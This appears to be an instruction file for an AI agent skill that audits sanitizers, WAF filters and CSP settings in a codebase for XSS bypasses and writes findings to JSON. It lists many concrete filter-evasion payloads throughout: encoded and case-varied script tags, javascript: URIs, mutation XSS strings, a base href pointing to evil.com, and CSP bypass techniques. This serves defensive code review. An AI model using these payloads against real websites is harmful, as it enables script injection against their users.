Audit WAF rules, input filters, and XSS sanitization logic for bypass vulnerabilities. Reason about encoding gaps, mutation vectors, and filter evasion. This skill does NOT hunt for unsanitized sinks — use /frontend-hunt or /find-vulns for that. This skill audits the sanitization layer itself. Write structured findings to wafbypass-findings.json.

Do NOT flag missing sanitization. Only audit sanitization that EXISTS and reason about whether it can be bypassed. The finding is "this filter claims to prevent XSS but an attacker can use X technique to get past it."

## Background: Why This Skill Exists

Novee found a Stored XSS (WAF Bypass) in a collaboration feature where a filter existed but was incomplete. Most SAST tools either miss the filter entirely or flag everything as vulnerable. This skill reads the filter logic and tests it mentally against a comprehensive bypass library.

## Input

`$ARGUMENTS` format: `[--repo <path>] [--filter-files <comma-separated paths>]`

- `--repo <path>` — repo root (default: current directory)
- `--filter-files <paths>` — optional: specific sanitization files to focus on

## Step 1 — Locate Sanitization Logic

Glob for files likely to contain sanitization or WAF logic:

**Python:** Files importing `bleach`, `markupsafe`, `html`, `html.escape`, `re.sub` with HTML patterns, `DOMPurify` references, custom `sanitize_*` functions
**Java:** `ESAPI.encoder()`, `StringEscapeUtils`, `Jsoup.clean`, custom `sanitize` / `escape` methods, Spring `HtmlUtils`
**Node/TS:** `DOMPurify.sanitize`, `sanitize-html`, `xss`, `he.encode`, `validator.escape`, custom filter functions
**General:** Files named `sanitize*`, `escape*`, `filter*`, `waf*`, `cleaner*`, `purify*`, `xss*`

Also look for:
- Regex patterns that strip or block HTML characters: `/<[^>]*>/g`, `/javascript:/i`, `/on\w+=/i`
- Allowlist/blocklist arrays of HTML tags or attributes
- CSP headers set in middleware

## Step 2 — The 6 WAF Bypass Classes

For each sanitization function found, test it mentally against all classes below.

---

### Class 1 — HTML Encoding Gaps (CWE-116)

Proper HTML encoding converts `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`, `&` → `&amp;`.

**Bypass patterns when encoding is incomplete:**
- Only encoding `<` and `>` but not `"` → `" onmouseover="alert(1)` injects into attribute context
- Only encoding double quotes but not single quotes → `' onmouseover='alert(1)` injects
- Not encoding `&` → entity re-decoding bypass: `&lt;script&gt;` stored, then decoded on second render
- Context mismatch: encoding for HTML but output is in JavaScript context → no quotes needed

**For each HTML encoding function:**
1. Does it encode all 5 characters: `< > " ' &`?
2. Is the encoding applied in the correct context (HTML body vs attribute vs JS vs URL)?
3. Could the value be decoded and re-encoded in a way that strips escaping?

---

### Class 2 — Blocklist Filter Bypass (CWE-116)

Filters that block specific strings (`<script>`, `javascript:`, `on\w+=`) are bypassed by encoding and case variations.

**`<script>` bypass techniques:**
- Case: `<SCRIPT>`, `<Script>`, `<sCrIpT>`
- Broken tag: `<sc\nript>`, `<sc\rript>`, `<scr ipt>` (some parsers ignore whitespace/newlines)
- Self-closing: `<script/>`
- HTML entity in tag name: `<sc&#114;ipt>` — works in some legacy parsers
- Double encoding: `%3Cscript%3E`, `%253Cscript%253E`
- Null byte: `<scr\x00ipt>` — some filters stop at null byte

**`javascript:` bypass techniques:**
- Case: `JavaScript:`, `JAVASCRIPT:`, `jAvAsCrIpT:`
- Encoding: `java&#115;cript:`, `java\x73cript:`
- Whitespace: `  javascript:` — leading whitespace, tabs, newlines before the colon
- Entities: `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;`

**`on\w+=` event handler bypass:**
- Unusual event handlers not in filter: `ontoggle=`, `onpointerdown=`, `onanimationstart=`, `onformdata=`
- Whitespace around `=`: `onclick =`, `onclick\t=`, `onclick\n=`
- Slash: `onclick/onclick=alert(1)` (some parsers)
- SVG-specific handlers: `onbegin=`, `onend=`

**For each blocklist filter:**
1. Does it use case-insensitive matching?
2. Does it handle HTML entity encoding of blocked strings?
3. Does it cover unusual event handlers (see list above)?
4. Does filtering happen before or after URL/HTML decoding?

---

### Class 3 — Mutation XSS (mXSS) (CWE-79)

The browser's HTML parser normalizes HTML in ways that can reintroduce XSS after sanitization.

**Classic mXSS pattern:**
Sanitizer sees: `<p>safe<!-- </p><img src=x onerror=alert(1)> --></p>`
Browser parses: the comment confuses the tree builder, moving content outside the comment

**Namespace confusion:**
- `<svg><p id="</p><img src=x onerror=alert(1)>"></p></svg>` — inside SVG, `<p>` is parsed differently
- MathML namespace: `<math><p>text</p></math>` — parser switches context
- `<noscript>` and `<noframes>` content is parsed differently in some modes

**Template literal injection in SVG:**
- `<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>`
- `<svg><use href="data:image/svg+xml,..."/>` 

**DOMPurify-specific mXSS (versions < 3.1.0):**
- `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>` — exploits parser re-entry

**For each sanitization library:**
1. Is DOMPurify version < 3.1.0? → known mXSS vulnerabilities exist
2. Does the filter handle SVG/MathML namespace context switches?
3. Is sanitization done in the same DOM context as rendering (browser-side), or server-side with a different parser?

---

### Class 4 — Context-Sensitive Injection

The same input can be safe in one context and dangerous in another. Filters that don't account for output context miss entire injection classes.

**Contexts and required escaping:**

| Output context | Dangerous characters | Required escape |
|---|---|---|
| HTML body | `< > & "` | HTML entities |
| HTML attribute (quoted) | `"` or `'` depending on quote char | HTML entities |
| HTML attribute (unquoted) | All of the above + whitespace | HTML entities |
| JavaScript string | `\n \r " ' \` | JS backslash escaping |
| JavaScript block | Literal `</script>` | `<\/script>` |
| URL parameter | All non-URL chars | URL encoding |
| CSS value | `( ) < > '` | CSS hex encoding |

**For each sanitizer:**
1. Does it detect the output context, or apply one-size-fits-all encoding?
2. If output is in a JS context: does it encode `"`, `'`, `\n`, `\r`, `</script>`?
3. If output is in a URL context: does it encode all reserved characters?

---

### Class 5 — Allowlist Bypass via Permitted Sinks

Even allowlist-based sanitizers (like DOMPurify default) permit certain elements that enable XSS in specific scenarios.

**Permitted elements that enable injection:**
- `<a href="javascript:alert(1)">` — `href` with `javascript:` protocol (allowed by default in many sanitizers)
- `<form action="javascript:alert(1)">` — form action with JS protocol
- `<iframe src="javascript:alert(1)">` — if iframe is allowed
- `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` — meta refresh
- `<base href="//evil.com/">` — redirects all relative links
- `<object data="data:text/html,<script>alert(1)</script>">` — data URI

**DOMPurify allowlist holes:**
- By default allows `<a href>` — check if `javascript:` protocol is blocked
- DOMPurify < 2.4: `<math>` and `<svg>` namespace bypass
- Custom `ADD_ATTR` or `ADD_TAGS` that includes dangerous attributes

**For each allowlist sanitizer:**
1. Does it block `javascript:` in href/src/action attributes?
2. Does it block `data:` URIs?
3. Does it handle SVG/MathML namespaces?
4. Are there custom additions (`ADD_TAGS`, `ADD_ATTR`) that introduce dangerous elements?

---

### Class 6 — CSP Bypass

A Content Security Policy is a second line of defense. If the CSP has gaps, XSS that slips past the filter can still execute.

**Common CSP weaknesses:**
- `unsafe-inline` in `script-src` — negates XSS protection entirely
- `unsafe-eval` — allows `eval()` exploitation
- Overly broad `script-src`: `*`, `https:` — allows loading from any HTTPS host
- Whitelisted CDN with JSONP endpoint: `script-src 'self' cdn.example.com` + JSONP at `cdn.example.com/api?callback=alert(1)`
- `script-src 'nonce-...'` with predictable nonce — attacker guesses nonce
- Missing `object-src 'none'` — `<object>` loads Flash/plugins
- Missing `base-uri 'none'` — `<base href>` injection possible

**For each CSP configuration found:**
1. Does it include `unsafe-inline` or `unsafe-eval`?
2. Is `script-src` restricted to known, JSONP-free hosts?
3. Is `object-src` set to `'none'`?
4. Is `base-uri` set to `'self'` or `'none'`?

---

## Step 3 — Build the Scan Queue

Priority order:
1. Custom sanitization functions and classes
2. Third-party sanitizer configuration (`DOMPurify.sanitize` options, `bleach.clean` tags/attributes)
3. Regex filters for HTML/XSS
4. CSP middleware configuration
5. Any input validation that claims to block XSS

## Step 4 — Analyze Each Sanitizer

Read the full sanitization function. Apply all 6 classes.

**For each filter function:**
> Q1 (Encoding): Does it encode all required characters for the output context?
> Q2 (Blocklist): If blocklist-based, does it handle case, encoding, and all event handlers?
> Q3 (mXSS): Does sanitization happen server-side with a different parser than the browser?
> Q4 (Context): Is one sanitizer applied to all output contexts, or is it context-aware?
> Q5 (Allowlist): Does the allowlist permit `href`, and if so, is `javascript:` blocked?
> Q6 (CSP): Is there a CSP, and does it have `unsafe-inline`, broad hosts, or JSONP endpoints?

## Step 5 — Score and Filter

**Confidence:**
- **0.90–1.00** — Bypass payload clearly passes the filter logic as read; specific technique confirmed
- **0.70–0.89** — Likely bypass based on filter structure; may depend on browser version or mode
- **0.50–0.69** — Theoretical bypass that requires unusual browser behavior
- **< 0.50** — Discard

**Number:** `WB-001`, `WB-002`, ...

**Severity:**

| Severity | Criteria |
|---|---|
| Critical | Complete bypass reachable by regular users with a reliable payload |
| High | Bypass requires specific browser or mode; or requires admin to set content |
| Medium | CSP bypass that requires chaining with another vulnerability |
| Low | Theoretical mXSS requiring very specific conditions |

## Step 6 — Write wafbypass-findings.json

```json
{
  "scanned_at": "<ISO 8601 timestamp>",
  "repo_path": "<absolute path>",
  "total_findings": 0,
  "findings_by_severity": { "critical": 0, "high": 0, "medium": 0, "low": 0 },
  "findings": [
    {
      "id": "WB-001",
      "class": "encoding-gap | blocklist-bypass | mutation-xss | context-mismatch | allowlist-hole | csp-bypass",
      "cwe": "CWE-116",
      "severity": "high | critical | medium | low",
      "confidence": 0.88,
      "confidence_note": "",
      "file": "web/src/common/purify.ts",
      "line": 57,
      "function": "BrandedHTMLPolicy",
      "bypass_technique": "Event handler not in FORBID_ATTR blocklist",
      "bypass_payload": "<img src=x onpointerdown=\"alert(document.domain)\">",
      "why_it_works": "FORBID_ATTR blocks onerror/onclick/onload etc but does not include onpointerdown. DOMPurify default allows <img> and any attribute not explicitly forbidden.",
      "sanitizer_config": "FORBID_TAGS + FORBID_ATTR blocklist approach without ALLOWED_TAGS",
      "description": "BrandedHTMLPolicy uses a blocklist of forbidden attributes that omits modern pointer, keyboard, and animation event handlers. An attacker who can inject into brand-controlled content can execute JavaScript via onpointerdown.",
      "fix_hint": "Replace FORBID_TAGS/FORBID_ATTR with ALLOWED_TAGS/ALLOWED_ATTR allowlist. Only permit known-safe tags (a, b, i, em, strong, br) and no event handler attributes."
    }
  ],
  "skipped_files": [],
  "warnings": []
}
```

## Hard Rules

- This skill only audits filters that EXIST. Do not create findings for missing sanitization — use `/frontend-hunt` for that.
- `bypass_payload` must be a concrete payload that passes the specific filter, not a generic XSS example.
- `why_it_works` must explain exactly why the specific filter fails for this specific payload.
- Do not flag a DOMPurify configuration using `ALLOWED_TAGS` (allowlist) as a bypass — that is the correct approach.
- Do not flag `html.escape()` / `&lt;`-style encoding as a bypass unless the output context makes it insufficient.

## Completion

```
waf-bypass complete.
  Repo          : <repo_path>
  Sanitizers audited : <N>
  Findings      : <total> (<critical> critical / <high> high / <medium> medium / <low> low)
  Output        : wafbypass-findings.json
```
